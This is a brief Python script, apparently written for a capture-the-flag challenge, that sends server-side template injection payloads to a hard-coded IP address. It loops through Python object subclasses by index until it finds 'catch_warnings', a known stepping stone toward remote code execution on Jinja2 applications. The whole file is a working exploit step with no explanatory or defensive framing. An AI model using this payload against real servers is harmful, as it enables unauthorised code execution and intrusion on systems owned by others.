import requests

target='http://202.112.47.60:8009/?name={{{{%27123%27.__class__.__mro__[1].__subclasses__()[{}]}}}}'

for i in range(500):
    r=requests.get(target.format(i))
    if 'catch_warnings' in r.text:
        print(i)
        break